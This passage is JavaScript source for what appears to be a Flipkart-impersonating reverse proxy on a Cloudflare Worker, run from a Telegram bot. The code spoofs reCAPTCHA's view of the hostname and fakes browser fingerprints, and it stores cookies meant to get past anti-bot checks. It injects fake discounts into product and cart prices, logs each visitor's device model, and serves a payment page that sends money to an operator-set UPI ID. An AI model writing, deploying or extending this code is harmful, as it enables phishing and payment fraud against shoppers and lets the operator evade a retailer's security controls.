    cleaned = cleaned.replace(new RegExp("//" + escHost + "/__fk/([a-z0-9.-]+)/", "g"), "//$1/");

    // 2. Absolute URLs with __fk (escaped)
    cleaned = cleaned.replace(new RegExp("https?:\\\\/\\\\/" + escHost + "\\\\/__fk\\\\/([a-z0-9.-]+)\\\\/", "g"), "https:\\/\\/$1\\/");
    cleaned = cleaned.replace(new RegExp("\\\\/\\\\/" + escHost + "\\\\/__fk\\\\/([a-z0-9.-]+)\\\\/", "g"), "\\/\\/$1\\/");

    // 3. Strip relative __fk subdomains (unescaped: __fk/[subdomain]/ -> empty)
    cleaned = cleaned.replace(/__fk\/[a-z0-9.-]+\//g, "");

    // 4. Strip relative __fk subdomains (escaped: __fk\/[subdomain]\/ -> empty)
    cleaned = cleaned.replace(/__fk\\\/[a-z0-9.-]+\\\//g, "");

    // 5. Base worker host (unescaped)
    cleaned = cleaned.replace(new RegExp("https?://" + escHost + "/", "g"), "https://www.flipkart.com/");
    cleaned = cleaned.replace(new RegExp("//" + escHost + "/", "g"), "//www.flipkart.com/");

    // 6. Base worker host (escaped)
    cleaned = cleaned.replace(new RegExp("https?:\\\\/\\\\/" + escHost + "\\\\/", "g"), "https:\\/\\/www.flipkart.com\\/");
    cleaned = cleaned.replace(new RegExp("\\\\/\\\\/" + escHost + "\\\\/", "g"), "\\/\\/www.flipkart.com\\/");

    bodyStr = cleaned.slice(0, 600);
    bodyBuf = new TextEncoder().encode(cleaned).buffer;
  }

  const t0 = Date.now();
  let upstream;
  try {
    upstream = await fetch(target, {
      method: request.method,
      headers: fwdH,
      body: bodyBuf || undefined,
      redirect: "manual",
    });
  } catch (e) {
    ctx.waitUntil(tg(`❌ FETCH ERR\n${subdomain}/${subpath}\n${e.message}`));
    return new Response("Proxy error", { status: 502 });
  }
  const ms = Date.now() - t0;

  const setCookies = upstream.headers.getAll
    ? upstream.headers.getAll("set-cookie")
    : upstream.headers.get("set-cookie")
      ? [upstream.headers.get("set-cookie")]
      : [];
  if (setCookies.length) {
    parseCookies(setCookies, jar);
    ctx.waitUntil(saveBypassCookies(jar));
  }

  if ([301, 302, 303, 307, 308].includes(upstream.status)) {
    const loc = rewriteUrl(upstream.headers.get("location") || "", base);
    const rh = new Headers({
      Location: loc,
      "Access-Control-Allow-Origin": origin || "*",
      "Access-Control-Allow-Credentials": "true",
    });
    for (const sc of setCookies)
      rh.append(
        "Set-Cookie",
        sc.replace(/;\s*domain=[^;]*/gi, "").replace(/;\s*secure/gi, ""),
      );
    return new Response(null, { status: upstream.status, headers: rh });
  }

  const ct = upstream.headers.get("content-type") || "";
  let respBody;

  if (
    ct.includes("json") ||
    ct.includes("text/html") ||
    ct.includes("javascript")
  ) {
    const respText = await upstream.text();
    if (ct.includes("json")) {
      const skipDiscount =
        subpath.includes("user/state") ||
        subpath.includes("login") ||
        subpath.includes("otp") ||
        subpath.includes("verify") ||
        subpath.includes("captcha");
      respBody = skipDiscount
        ? respText
        : applyDiscountToJson(respText, discountPct);
    } else if (
      ct.includes("javascript") &&
      (subdomain.includes("google.com") || subdomain.includes("gstatic.com"))
    ) {
      respBody = respText
        .replace(/location\.hostname/g, "'www.flipkart.com'")
        .replace(/location\.host/g, "'www.flipkart.com'")
        .replace(/window\.location\.hostname/g, "'www.flipkart.com'")
        .replace(/window\.location\.host/g, "'www.flipkart.com'")
        .replace(/document\.location\.hostname/g, "'www.flipkart.com'")
        .replace(/document\.location\.host/g, "'www.flipkart.com'")
        .replace(
          /window\.location\.href/g,
          "window.location.href.replace(window.location.host, 'www.flipkart.com')",
        )
        .replace(
          /location\.href/g,
          "location.href.replace(window.location.host, 'www.flipkart.com')",
        )
        .replace(/location\.ancestorOrigins/g, "['https://www.flipkart.com']")
        .replace(
          /https?:\/\/www\.google\.com\/recaptcha\//g,
          `${base}__fk/www.google.com/recaptcha/`,
        )
        .replace(
          /https?:\/\/www\.gstatic\.com\/recaptcha\//g,
          `${base}__fk/www.gstatic.com/recaptcha/`,
        );
    } else {
      respBody = respText;
    }
    ctx.waitUntil(
      tg(
        `📡 ${request.method} /__fk/${subdomain}/${subpath} → ${upstream.status} · ${ms}ms${discountPct > 0 ? ` 🏷️${discountPct}%` : ""}`,
      ),
    );
  } else {
    respBody = upstream.body;
  }

  const rh = new Headers();
  rh.set("Access-Control-Allow-Origin", origin || "*");
  rh.set("Access-Control-Allow-Credentials", "true");
  rh.set("Access-Control-Expose-Headers", "X-BOT,X-ACK-RESPONSE");
  for (const [k, v] of upstream.headers) {
    const lk = k.toLowerCase();
    if (
      [
        "set-cookie",
        "access-control-allow-origin",
        "access-control-allow-credentials",
        "access-control-expose-headers",
        "content-encoding",
        "transfer-encoding",
        "content-length",
      ].includes(lk)
    )
      continue;
    rh.set(k, v);
  }
  for (const sc of setCookies)
    rh.append(
      "Set-Cookie",
      sc.replace(/;\s*domain=[^;]*/gi, "").replace(/;\s*secure/gi, ""),
    );
  return new Response(respBody, { status: upstream.status, headers: rh });
}

// ── Main Worker ───────────────────────────────────────────────
const workerObj = {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    const origin = request.headers.get("origin") || "";
    const base = `${url.protocol}//${url.host}/`;

    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": origin || "*",
          "Access-Control-Allow-Credentials": "true",
          "Access-Control-Allow-Methods": "GET,POST,PUT,DELETE,OPTIONS,PATCH",
          "Access-Control-Allow-Headers":
            "Content-Type,Authorization,Cookie,x-requested-with,x-user-agent,flipkart_secure,fkua-User-Agent,Network-Type,sec-ch-ua,sec-ch-ua-platform,sec-ch-ua-mobile,X-ACK-RESPONSE,X-PARTNER-CONTEXT",
          "Access-Control-Max-Age": "2592000",
        },
      });
    }

    if (path === "/__fk_log_device") {
      const model = url.searchParams.get("model") || "";
      if (model && model !== "K" && model !== "k" && model !== "Android Device") {
        ctx.waitUntil(handleNewVisitor(model));
      }
      return new Response("OK", {
        headers: {
          "Access-Control-Allow-Origin": origin || "*",
          "Access-Control-Allow-Credentials": "true"
        }
      });
    }

    await loadBypassCookies();

    if (path === "/__tgwebhook" && request.method === "POST") {
      try {
        const body = await request.json();
        const msg = body?.message;
        if (msg?.text) {
          const chatId = String(msg.chat.id);
          const text = msg.text.trim();
          const cmd = text.split(/\s+/)[0].split("@")[0].toLowerCase();

          if (chatId === TG_CHAT) {
            if (cmd === "/discountstatus") {
              const cur = await getDiscount();
              await tg(
                cur > 0
                  ? `📊 Current discount: ${cur}%\nSite pe ${cur}% discount active hai.\n\nHatane ke liye: /discount off`
                  : "📊 Koi discount active nahi.\nReal Flipkart prices dikh rahi hain.\n\nLagane ke liye: /discount 30",
                chatId
              );
            } else if (cmd === "/discount") {
              const parts = text.split(/\s+/);
              const arg = (parts[1] || "").toLowerCase();
              if (!arg || arg === "off" || arg === "0") {
                await setDiscount(0);
                await tg(
                  "✅ Discount hataya gaya!\nAb site pe real Flipkart prices dikhenge.",
                  chatId
                );
              } else {
                const pct = parseFloat(arg);
                if (!isNaN(pct) && pct >= 5 && pct <= 99) {
                  await setDiscount(pct);
                  await tg(
                    `✅ ${pct}% discount LIVE ho gaya!\n\nAb https://flipkart.knandkk07.workers.dev/ pe saare products ${pct}% kam price mein dikhenge.\n\n⚠️ Ye sirf UI demo hai — actual checkout pe real price lagegi.`,
                    chatId
                  );
                } else {
                  await tg(
                    "❌ Format: /discount 30\nRange: 5 se 99 tak\n\nHatane ke liye: /discount off",
                    chatId
                  );
                }
              }
            } else if (cmd === "/seecookies") {
              try {
                const raw = await getRedis("bypass_cookies");
                if (!raw) {
                  await tg(
                    "🍪 Redis mein koi bypass cookie nahi hai abhi.\n\nAdd karne ke liye:\n/addcookie cf_clearance=xxx; _pxhd=yyy",
                    chatId
                  );
                } else {
                  const parts = raw
                    .split(";")
                    .map((s) => s.trim())
                    .filter(Boolean);
                  const lines = parts.map((p) => `  • ${p}`).join("\n");
                  await tg(
                    `🍪 Current bypass cookies (${parts.length}):\n\n${lines}`,
                    chatId
                  );
                }
              } catch (e) {
                await tg(`❌ Error: ${e.message}`, chatId);
              }
            } else if (cmd === "/removecookie") {
              try {
                await deleteRedis("bypass_cookies");
                _bypassCache = "";
                _bypassCacheAt = 0;
                bypassJar.clear();
                await tg(
                  "🗑️ Bypass cookies Redis se delete ho gayi!\n\nBypassJar aur memory cache bhi clear.\n\nAgle visitor ke liye fresh cookies fetch hongi Flipkart se.",
                  chatId
                );
              } catch (e) {
                await tg(`❌ Error: ${e.message}`, chatId);
              }
            } else if (cmd === "/addcookie") {
              const raw = text.slice("/addcookie".length).trim();
              if (!raw) {
                await tg(
                  "❌ Format:\n/addcookie cf_clearance=abc; _pxhd=xyz\n\nMultiple cookies semicolon se alag karo.",
                  chatId
                );
              } else {
                try {
                  const parts = raw
                    .split(";")
                    .map((s) => s.trim())
                    .filter(Boolean);
                  const safe = [];
                  const skipped = [];
                  for (const part of parts) {
                    const eq = part.indexOf("=");
                    if (eq <= 0) continue;
                    const k = part.slice(0, eq).trim();
                    const v = part.slice(eq + 1).trim();
                    if (!k || !v) continue;
                    if (ALLOWED_BYPASS_COOKIE_RE.test(k)) {
                      safe.push(`${k}=${v}`);
                    } else {
                      skipped.push(k);
                    }
                  }
                  if (safe.length === 0) {
                    await tg(
                      `❌ Koi bhi bypass cookie nahi mili.\n\nYe cookies allowlist mein nahi hain aur save nahi ki ja sakti:\n${skipped.map((k) => `  • ${k}`).join("\n")}\n\nSirf bypass cookies dalo, jaise: cf_clearance, ak_bmsc, _pxhd, __fbp, _gcl_au`,
                      chatId
                    );
                  } else {
                    const merged = safe.join("; ");
                    await setRedis("bypass_cookies", merged);
                    _bypassCache = merged;
                    _bypassCacheAt = Date.now();
                    _applyBypassString(merged);
                    let msgStr = `✅ ${safe.length} cookie(s) save ho gayi (23 ghante ke liye):\n${safe.map((c) => `  ✓ ${c.split("=")[0]}`).join("\n")}`;
                    if (skipped.length > 0)
                      msgStr += `\n\n⚠️ ${skipped.length} non-bypass cookie(s) SKIP ki:\n${skipped.map((k) => `  ✗ ${k}`).join("\n")}`;
                    await tg(msgStr, chatId);
                  }
                } catch (e) {
                  await tg(`❌ Error: ${e.message}`, chatId);
                }
              }
            } else if (cmd === "/devices") {
              try {
                const raw = await getRedis("devices_list");
                const devices = raw ? JSON.parse(raw) : [];
                if (devices.length === 0) {
                  await tg("📱 No devices recorded yet.", chatId);
                } else {
                  const lines = devices.map((d, i) => `${i + 1}. <code>${d}</code>`).join("\n");
                  await tg(`📱 <b>Recorded Devices (${devices.length}):</b>\n\n${lines}`, chatId);
                }
              } catch (e) {
                await tg(`❌ Error: ${e.message}`, chatId);
              }
            } else if (cmd === "/listen") {
              const parts = text.split(/\s+/);
              const arg = (parts[1] || "").toLowerCase();
              if (arg === "on") {
                await setRedis("listen_state", "on");
                await tg("🔊 Visitor notifications turned <b>ON</b>.", chatId);
              } else if (arg === "off") {
                await setRedis("listen_state", "off");
                await tg("🔇 Visitor notifications turned <b>OFF</b>.", chatId);
              } else {
                const cur = await getRedis("listen_state") || "on";
                await tg(`🔊 Current listen state: <b>${cur.toUpperCase()}</b>\nUse <code>/listen on</code> or <code>/listen off</code> to change.`, chatId);
              }
            } else if (cmd === "/addupi") {
              const parts = text.split(/\s+/);
              const upiId = parts[1];
              if (!upiId) {
                await tg("<b>Usage:</b>\n<code>/addupi vikram2517@ptaxis</code>", chatId);
              } else if (!upiId.includes("@")) {
                await tg("<b>Invalid UPI ID</b>\nUPI ID must contain @ symbol.", chatId);
              } else {
                await setRedis("active_upi", upiId);
                await setRedis("active_upi_added_at", new Date().toISOString());
                await tg(`<b>UPI ID Added Successfully!</b>\n\nUPI ID: <code>${upiId}</code>\nStatus: Active\n\nPayment page is now live.`, chatId);
              }
            } else if (cmd === "/removeupi") {
              const current = await getRedis("active_upi");
              if (!current) {
                await tg("<b>No Active UPI ID</b>\nNo UPI ID is currently configured.", chatId);
              } else {
                await deleteRedis("active_upi");
                await deleteRedis("active_upi_added_at");
                await tg(`<b>UPI ID Removed!</b>\n\nRemoved: <code>${current}</code>`, chatId);
              }
            } else if (cmd === "/upistatus" || cmd === "/status") {
              const upiId = await getRedis("active_upi");
              const addedAt = await getRedis("active_upi_added_at");
              if (upiId) {
                await tg(`<b>UPI Status: Active</b>\n\nUPI ID: <code>${upiId}</code>\nAdded: ${addedAt || 'N/A'}`, chatId);
              } else {
                await tg("<b>UPI Status: Inactive</b>\n\nNo UPI ID is currently configured.", chatId);
              }
            } else if (cmd === "/cleardevices" || cmd === "/clear") {
              try {
                await setRedis("devices_list", JSON.stringify([]));
                await tg("🧹 Device history has been cleared successfully! All next visits will be treated as new users.", chatId);
              } catch (e) {
                await tg(`❌ Error: ${e.message}`, chatId);
              }
            } else if (cmd === "/help" || cmd === "/start") {
              await tg(
                `🛠 <b>Flipkart Proxy Bot — Commands:</b>\n\n` +
                `━━━ 💸 <b>UPI PAYMENT</b> ━━━\n` +
                `<code>/addupi &lt;upi_id&gt;</code> — Set active UPI ID\n` +
                `<code>/removeupi</code> — Remove active UPI ID\n` +
                `<code>/upistatus</code> — Check current active UPI ID\n\n` +
                `━━━ 🏷️ <b>DISCOUNT</b> ━━━\n` +
                `<code>/discount 30</code> — 30% discount lagao (5-99%)\n` +
                `<code>/discount off</code> — Discount hatao\n` +
                `<code>/discountstatus</code> — Current discount check karo\n\n` +
                `━━━ 📱 <b>VISITOR TRACKING</b> ━━━\n` +
                `<code>/devices</code> — Visited device models list dekho\n` +
                `<code>/listen on/off</code> — New user alerts turn ON or OFF\n` +
                `<code>/cleardevices</code> — Clear device history (reset)\n\n` +
                `━━━ 🍪 <b>COOKIES</b> ━━━\n` +
                `<code>/seecookies</code> — KV mein stored bypass cookies dekho\n` +
                `<code>/addcookie cf_clearance=xxx; _pxhd=yyy</code> — Manually cookies add karo\n` +
                `<code>/removecookie</code> — Saari bypass cookies delete karo`,
                chatId
              );
            }
          } else if (cmd === "/start" || cmd === "/help") {
            await tg("<b>Unauthorized</b>\nYou are not allowed to use this bot.", chatId);
          }
        }
      } catch (_) { }
      return new Response("OK", { status: 200 });
    }



    const [discountPct] = await Promise.all([
      getDiscount(),
      // Load cached bypass cookies so fresh visitors look like returning users
      loadBypassCookies(env.FLIP_DISCOUNT),
    ]);

    // Per-request cookie jar — starts with bypass cookies but is ISOLATED
    // per request so User A's session never leaks to User B.
    const reqJar = new Map(bypassJar);

    if (path === "/api/upi" || path === "/upi") {
      const upiId = await getRedis("active_upi");
      const addedAt = await getRedis("active_upi_added_at");
      return new Response(
        JSON.stringify({
          active: !!upiId,
          upiId: upiId || "",
          addedAt: addedAt || "",
        }),
        {
          headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": origin || "*",
            "Access-Control-Allow-Credentials": "true",
            "Cache-Control": "no-store",
          },
        },
      );
    }

    if (path === "/" && (url.search.startsWith("?=") || url.search.includes("?="))) {
      return servePaymentGatewayPage(request, origin);
    }

    const fkm = path.match(
      /^\/__fk\/([a-z0-9.-]+\.(?:flipkart|flixcart|google|gstatic)\.com)(\/.*)?$/,
    );
    if (fkm) {
      return proxySubdomain(
        request,
        fkm[1],
        (fkm[2] || "/").replace(/^\//, ""),
        url.search,
        origin,
        base,
        discountPct,
        ctx,
        env,
        reqJar,
      );
    }

    if (path.startsWith("/api/") || path.startsWith("/4/")) {
      return proxySubdomain(
        request,
        "2.rome.api.flipkart.com",
        path.replace(/^\//, ""),
        url.search,
        origin,
        base,
        discountPct,
        ctx,
        env,
        reqJar,
      );
    }

    const RV_MAP = {
      "rv/orders": "account/orders",
      "rv/cart": "viewcart",
      "rv/wishlist": "wishlist",
      "rv/profile": "my-account",
      "rv/address": "account/address",
      "rv/wallet": "account/flipkart-money",
    };
    if (path.startsWith("/rv/")) {
      const rv = path.replace(/^\//, "");
      return Response.redirect(
        `${base}${RV_MAP[rv] || rv.replace(/^rv\//, "account/")}${url.search}`,
        302,
      );
    }

    const fkPath = path === "/" ? "" : path.replace(/^\//, "");
    const fkTarget = `https://flipkart.knandkk07.workers.dev/${fkPath}${url.search}`;

    let bodyBuf = null;
    if (!["GET", "HEAD"].includes(request.method))
      bodyBuf = await request.arrayBuffer();

    const DESKTOP_PATHS = [
      "account/orders",
      "account/address",
      "account/flipkart-money",
    ];
    const useDesktop = DESKTOP_PATHS.some((p) => fkPath.startsWith(p));

    const clientIp =
      request.headers.get("CF-Connecting-IP") ||
      request.headers.get("X-Forwarded-For") ||
      "";

    function buildMainHeaders() {
      const cookie = buildCookieHeader(
        request.headers.get("cookie") || "",
        reqJar,
      );

      const clientUA = request.headers.get("user-agent") || "";
      let finalUA = useDesktop ? DESKTOP_UA : MOBILE_UA;
      let finalFkua = useDesktop ? "" : BASE_UA;

      if (clientUA) {
        if (useDesktop) {
          finalUA = clientUA;
          finalFkua = "";
        } else {
          if (clientUA.includes("Mobile")) {
            if (!clientUA.includes("FKUA")) {
              finalUA = clientUA + " FKUA/msite/0.0.3/msite/Mobile";
            } else {
              finalUA = clientUA;
            }
            finalFkua = finalUA.replace(/\s*FKUA\/msite\/0\.0\.3\/msite\/Mobile/g, "");
          } else {
            // Force mobile UA on desktop browser if useDesktop is false
            finalUA = MOBILE_UA;
            finalFkua = BASE_UA;
          }
        }
      }

      const incomingReferer = request.headers.get("referer") || "";
      let ref = "https://www.flipkart.com/";
      if (incomingReferer) {
        try {
          const refUrl = new URL(incomingReferer);
          refUrl.host = "www.flipkart.com";
          refUrl.protocol = "https:";
          ref = refUrl.toString();
        } catch (e) { }
      }

      const h = {
        "User-Agent": finalUA,
        Accept:
          request.headers.get("accept") ||
          "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
        "Accept-Encoding": "identity",
        Referer: ref,
        ...(finalFkua ? { "fkua-User-Agent": finalFkua } : {}),
        ...(cookie ? { Cookie: cookie } : {}),
        ...(request.headers.get("content-type")
          ? { "Content-Type": request.headers.get("content-type") }
          : {}),
        ...(clientIp
          ? {
            "X-Forwarded-For": clientIp,
            "X-Real-IP": clientIp,
            "True-Client-IP": clientIp,
            "CF-Connecting-IP": clientIp,
          }
          : {}),
      };
      return h;
    }

    const t0 = Date.now();
    let upstream;
    try {
      upstream = await fetch(fkTarget, {
        method: request.method,
        headers: buildMainHeaders(),
        body: bodyBuf || undefined,
        redirect: "follow",
      });
    } catch (e) {
      ctx.waitUntil(tg(`❌ MAIN ERR /${fkPath}: ${e.message}`));
      return new Response("Proxy error", { status: 502 });
    }

    // ── Smart retry on 403 bot challenge ──────────────────────
    if (upstream.status === 403 && request.method === "GET") {
      const delays = [200, 500, 1000];
      for (const delay of delays) {
        const c403 = upstream.headers.getAll
          ? upstream.headers.getAll("set-cookie")
          : upstream.headers.get("set-cookie")
            ? [upstream.headers.get("set-cookie")]
            : [];
        if (c403.length) {
          parseCookies(c403, reqJar);
        }

        await new Promise((r) => setTimeout(r, delay));
        try {
          const retry = await fetch(fkTarget, {
            method: request.method,
            headers: buildMainHeaders(),
            redirect: "follow",
          });
          if (retry.status !== 403) {
            upstream = retry;
            break;
          }
          upstream = retry;
        } catch (_) {
          break;
        }
      }
    }

    const ms = Date.now() - t0;

    const setCookies = upstream.headers.getAll
      ? upstream.headers.getAll("set-cookie")
      : upstream.headers.get("set-cookie")
        ? [upstream.headers.get("set-cookie")]
        : [];
    if (setCookies.length) {
      parseCookies(setCookies, reqJar);
    }

    // ── Now save bypass cookies after parsing ──────────────────
    if (upstream.status === 200) {
      ctx.waitUntil(saveBypassCookies(reqJar));
    }

    const ct = upstream.headers.get("content-type") || "";

    const isStatic = STATIC_EXT.test(fkPath.split("?")[0]);
    if (!isStatic) {
      ctx.waitUntil(
        tg(
          `📡 ${request.method} /${fkPath || "(home)"} → ${upstream.status} · ${ms}ms${discountPct > 0 ? ` 🏷️${discountPct}%` : ""}`,
        ),
      );
    }

    if (ct.includes("text/html")) {
      // Banner removed — no message shown to user

      const domPriceScript = buildDomPriceScript(discountPct);

      // ── CLIENT-SIDE INTERCEPTOR ────────────────────────────
      // Session 8 approach from help.txt:
      //   Layer A: JSON.parse override (discount all parsed JSON)
      //   Layer B: Hydration state interceptors (window.__staticRouterHydrationData etc.)
      //   Layer C: fetch() override with FIXED Request object handling + djson()
      //   Layer D: XHR URL rewrite + headers
      // PLUS: DOM MutationObserver safety net (from oldworker.js stable base)
      const INTERCEPTOR = `<script>
(function(){
try {
  var originalUA = navigator.userAgent || '';
  var isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(originalUA);
  if (isMobile) {
    // Mobile par real specs use karein, bas FKUA suffix append karein
    var mockUA = originalUA;
    if (originalUA.indexOf('FKUA') === -1) {
      mockUA = originalUA + ' FKUA/msite/0.0.3/msite/Mobile';
    }
    Object.defineProperty(navigator, 'userAgent', { get: function(){ return mockUA; }, configurable: true });
    try {
      if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
        navigator.userAgentData.getHighEntropyValues(['model']).then(function(uaData) {
          var m = uaData.model;
          if (m && m !== 'K' && m !== 'k') {
            fetch('/__fk_log_device?model=' + encodeURIComponent(m));
          }
        }).catch(function(){});
      } else {
        var ua = originalUA.toLowerCase();
        if (ua.indexOf('iphone') !== -1) {
          fetch('/__fk_log_device?model=iPhone');
        } else if (ua.indexOf('ipad') !== -1) {
          fetch('/__fk_log_device?model=iPad');
        }
      }
    } catch(err){}
  } else {
    // Desktop par forced mobile UA aur random device specifications apply karein
    var devices = [
      {
        ua: 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UD1A.230803.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36',
        model: 'Pixel 8 Pro',
        brand: 'Google',
        ver: '14.0.0'
      },
      {
        ua: 'Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36',
        model: 'SM-S928B',
        brand: 'Samsung',
        ver: '14.0.0'
      },
      {
        ua: 'Mozilla/5.0 (Linux; Android 14; CPH2581 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.143 Mobile Safari/537.36',
        model: 'CPH2581',
        brand: 'OnePlus',
        ver: '14.0.0'
      }
    ];
    // Dynamic random selection based on current timestamp
    var selected = devices[Math.floor(Math.random() * devices.length)];
    var mockUA = selected.ua + ' FKUA/msite/0.0.3/msite/Mobile';
    
    Object.defineProperty(navigator, 'userAgent', { get: function(){ return mockUA; }, configurable: true });
    Object.defineProperty(navigator, 'platform', { get: function(){ return 'Linux armv8l'; }, configurable: true });
    Object.defineProperty(navigator, 'maxTouchPoints', { get: function(){ return 5; }, configurable: true });
    if (navigator.userAgentData) {
      var mockData = {
        brands: [
          { brand: 'Chromium', version: '120' },
          { brand: 'Android WebView', version: '120' },
          { brand: 'Not(A)Brand', version: '99' }
        ],
        mobile: true,
        platform: 'Android',
        getHighEntropyValues: function(hints) {
          return Promise.resolve({
            architecture: '',
            bitness: '',
            brands: this.brands,
            formFactor: ['Mobile'],
            fullVersionList: this.brands,
            mobile: this.mobile,
            model: selected.model,
            platform: this.platform,
            platformVersion: selected.ver,
            uaFullVersion: '120.0.6099.144'
          });
        }
      };
      Object.defineProperty(navigator, 'userAgentData', { get: function(){ return mockData; }, configurable: true });
    }
  }
} catch(e) {}
var B='${base}';
var BASE_UA='${BASE_UA}';
var UA=BASE_UA+' FKUA/msite/0.0.3/msite/Mobile';
var MOCK=/sonic\\.fdp\\.api|sspa\\.flipkart|events\\.flipkart|bam\\.nr-data\\.net/;

function rw(u){
  if(!u||typeof u!=='string')return u;
  u=u.replace(/https?:\\/\\/(?:www|m)\\.flipkart\\.com\\//g,B);
  u=u.replace(/https?:\\/\\/([a-z0-9.-]+\\.(?:flipkart|flixcart|google|gstatic)\\.com)\\//g,B+'__fk/$1/');
  u=u.replace(/\\/\\/(?:www|m)\\.flipkart\\.com\\//g,B);
  u=u.replace(/\\/\\/([a-z0-9.-]+\\.(?:flipkart|flixcart|google|gstatic)\\.com)\\//g,B+'__fk/$1/');
  return u;
}

function injectH(h){
  h.set('flipkart_secure','true');
  h.set('X-Requested-With','com.wFlipkart_19923844');
  h.set('Network-Type','4g');
  try {
    var clientUA = navigator.userAgent || '';
    var isChromium = clientUA.toLowerCase().indexOf('chrome') !== -1 || clientUA.toLowerCase().indexOf('chromium') !== -1;
    var finalFkua = BASE_UA;
    if (clientUA) {
      if (clientUA.indexOf('Mobile') !== -1 && clientUA.indexOf('FKUA') === -1) {
        finalFkua = clientUA;
      } else {
        finalFkua = clientUA.replace(/\\s*FKUA\\/msite\\/0\\.0\\.3\\/msite\\/Mobile/g, "");
      }
    }
    var finalXua = finalFkua + " FKUA/msite/0.0.3/msite/Mobile";
    h.set('fkua-User-Agent', finalFkua);
    h.set('X-User-Agent', finalXua);
    if (isChromium) {
      h.set('sec-ch-ua','"Chromium";v="148", "Android WebView";v="148", "Not(A)Brand";v="99"');
      h.set('sec-ch-ua-platform','"Android"');
      h.set('sec-ch-ua-mobile','?1');
    }
  } catch(e) {}
}

var PCT=${discountPct};
var MULT=(100-PCT)/100;
var DOM_THRESH=Math.max(500,Math.round(500/MULT));

function fi(n){
  if(n<1000)return String(n);
  var s=String(n),r='',i=s.length,c=0;
  while(i--){if(c&&(c===3||(c>3&&(c-3)%2===0)))r=','+r;r=s[i]+r;c++;}
  return r;
}

// ── Layer A: JSON object recursive discounter ─────────────────
var PK={'finalPrice':1,'mrp':1,'sellingPrice':1,'baseSellingPrice':1,'primaryProductPrice':1,'totalPrice':1,'discountedPrice':1,'effectivePrice':1,'listingPrice':1,'price':1,'strikeThroughPrice':1,'offerPrice':1,'salePrice':1,'basePrice':1,'maxRetailPrice':1,'retailPrice':1,'SP':1,'fp':1,'unitPrice':1,'specialPrice':1,'totalAmount':1,'cartTotal':1,'orderTotal':1,'payableAmount':1,'grandTotal':1,'subTotal':1,'itemTotal':1,'netPrice':1,'strikePrice':1,'ourPrice':1,'bestPrice':1,'lowestPrice':1,'coinValue':1,'feeLabelPrice':1,'strikeOffPrice':1,'strikeOff':1,'originalPrice':1,'listPrice':1,'wasPrice':1,'mrpValue':1,'displayPrice':1,'totalMrp':1,'totalSavings':1,'totalSellingPrice':1,'totalCharge':1,'totalCharges':1,'totalPayable':1,'checkoutTotal':1,'basketTotal':1,'orderAmount':1,'cartAmount':1,'totalSp':1,'totalFinalPrice':1,'codCharges':1,'deliveryCharge':1,'offerSavings':1,'totalDiscount':1,'bagTotal':1,'checkoutAmount':1,'paymentAmount':1,'billAmount':1};

function isPK(k){
  if(!k)return false;
  var lk=k.toLowerCase();
  return !!PK[k]||
         lk.indexOf('price')!==-1||
         lk.indexOf('mrp')!==-1||
         lk.indexOf('strike')!==-1||
         lk.indexOf('amount')!==-1||
         lk.indexOf('payable')!==-1||
         lk.indexOf('saving')!==-1||
         lk.indexOf('charge')!==-1||
         lk.indexOf('fee')!==-1||
         lk.indexOf('tax')!==-1;
}

function isMrp(k) {
  if (!k) return false;
  var lk = k.toLowerCase();
  var mrpKeys = {
    mrp: 1,
    maxretailprice: 1,
    strikethroughprice: 1,
    strikeprice: 1,
    strikeoffprice: 1,
    strikeoff: 1,
    mrpvalue: 1,
    totalmrp: 1,
    originalprice: 1,
    wasprice: 1,
    listprice: 1,
    retailprice: 1
  };
  if (mrpKeys[lk]) return true;
  if (lk.indexOf('mrp') !== -1) return true;
  if (lk.indexOf('strike') !== -1) return true;
  if (
    lk.indexOf('originalprice') !== -1 ||
    lk.indexOf('wasprice') !== -1 ||
    lk.indexOf('listprice') !== -1 ||
    lk.indexOf('retailprice') !== -1
  ) {
    return true;
  }
  if (lk.indexOf('beforediscount') !== -1 || lk.indexOf('prediscount') !== -1) return true;
  return false;
}

function isDiscountPercent(k) {
  if (!k) return false;
  var lk = k.toLowerCase();
  return lk.indexOf("discount") !== -1 || lk.indexOf("off") !== -1 || lk.indexOf("savings") !== -1;
}

function isMrpString(s) {
  if (!s || typeof s !== "string") return false;
  var ls = s.toLowerCase().trim();
  return (
    ls === "mrp" ||
    ls === "m.r.p." ||
    ls === "strikeoff" ||
    ls === "strikeoffprice"
  );
}

function isMrpKeyVal(k, val) {
  if (!k) return false;
  var lk = k.toLowerCase();
  if (
    lk.indexOf("strike") !== -1 ||
    lk.indexOf("mrp") !== -1 ||
    lk.indexOf("original") !== -1 ||
    lk.indexOf("was") !== -1
  ) {
    if (val === true || String(val).toLowerCase() === "true") {
      return true;
    }
  }
  return false;
}

function discObj(o,pp,isMrpContext,isDiscountContext,_depth){
  if(!o||typeof o!=='object')return;
  if(o.__sd)return;
  if(o.__d)return;
  var depth=_depth||0;
  if(depth>30)return;
  try{
    Object.defineProperty(o,'__d',{value:true,writable:true,enumerable:false,configurable:true});
  }catch(e){
    try{o.__d=true;}catch(e2){return;}
  }
  var inr=(o.currency==='INR'||o.currencySymbol==='\u20b9');
  var sd=true;

  var objectIsMrp = isMrpContext;
  var objectIsDiscount = isDiscountContext;
  if (!Array.isArray(o)) {
    for (var k in o) {
      if (Object.prototype.hasOwnProperty.call(o, k)) {
        var val = o[k];
        if (isMrpKeyVal(k, val)) {
          objectIsMrp = true;
        }
        if (typeof val === "string") {
          if (isMrpString(val)) {
            objectIsMrp = true;
          }
          var lval = val.toLowerCase();
          if (lval === "percentage" || lval.indexOf("discount") !== -1) {
            objectIsDiscount = true;
          }
        } else if (val && typeof val === "object" && !Array.isArray(val)) {
